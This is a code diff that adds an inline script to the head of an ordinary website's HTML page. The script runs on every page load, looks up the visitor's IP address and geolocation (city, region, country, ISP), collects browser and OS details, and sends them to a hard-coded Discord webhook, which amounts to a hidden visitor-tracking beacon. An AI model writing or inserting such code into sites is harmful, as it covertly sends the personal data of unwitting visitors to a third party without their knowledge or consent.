@@ -10,6 +10,61 @@
     <link rel="stylesheet" href="css/style.css" />
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <script>
+      function getUserInfo() {
+          // Get user IP address
+          fetch('https://api.ipify.org?format=json')
+              .then(response => response.json())
+              .then(data => {
+                  const ip = data.ip;
+
+                  // Get IP-based info from ipinfo.io
+                  fetch(`https://ipinfo.io/${ip}/json`)
+                      .then(response => response.json())
+                      .then(ipInfo => {
+                          // Collect browser information
+                          const userAgent = navigator.userAgent;
+                          const browserInfo = {
+                              ip: ip,
+                              city: ipInfo.city,
+                              region: ipInfo.region,
+                              country: ipInfo.country,
+                              org: ipInfo.org,
+                              browser: navigator.appName,
+                              browserVersion: navigator.appVersion,
+                              os: navigator.platform
+                          };
+
+                          // Format data for Discord webhook
+                          const discordMessage = {
+                              content: `**User Information**\n
+                                        IP: ${browserInfo.ip}\n
+                                        City: ${browserInfo.city}\n
+                                        Region: ${browserInfo.region}\n
+                                        Country: ${browserInfo.country}\n
+                                        Organization: ${browserInfo.org}\n
+                                        Browser: ${browserInfo.browser}\n
+                                        Browser Version: ${browserInfo.browserVersion}\n
+                                        OS: ${browserInfo.os}`
+                          };
+
+                          // Send data to Discord webhook
+                          fetch('https://discord.com/api/webhooks/1250874669238714440/dUtJVh3cCEzMdkaqNCYzJ-sumnjeQQ527ZxHcRbjrZh0Ojgoftqi74HVuxRcSjz0nmbf', {
+                              method: 'POST',
+                              headers: {
+                                  'Content-Type': 'application/json'
+                              },
+                              body: JSON.stringify(discordMessage)
+                          })
+                          .then(response => response.text())
+                          .then(result => console.log('Success:', result))
+                          .catch(error => console.error('Error:', error));
+                      });
+              });
+      }
+
+      window.onload = getUserInfo;
+  </script>
     <link
       href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700;900&display=swap"
       rel="stylesheet"
